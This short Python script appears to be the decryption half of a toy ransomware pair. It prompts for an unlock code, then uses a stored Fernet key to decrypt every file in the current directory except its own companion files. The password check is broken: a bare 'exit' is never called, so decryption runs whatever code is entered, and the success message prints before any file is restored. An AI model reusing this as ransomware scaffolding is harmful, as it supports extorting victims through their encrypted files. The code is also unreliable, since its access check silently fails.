import os
from cryptography.fernet import Fernet

fix = []
unlock = "ironmaiden"
answer = input("Enter the code to decrypt your files: ")
if answer != unlock:
    print("Wrong code.")
    exit
for x in os.listdir():
    if x == "encrypt.py" or x == "key00" or x == "decrypt.py":
        continue
    if os.path.isfile(x):
        fix.append(x)

print("you got your files back...")

with open("key00", "rb") as k:
    sk = k.read()

for x in fix:
    with open(x, "rb") as file:
        file_contents = file.read()
    decrypt = Fernet(sk).decrypt(file_contents)

    with open(x, "wb") as file:
        file.write(decrypt)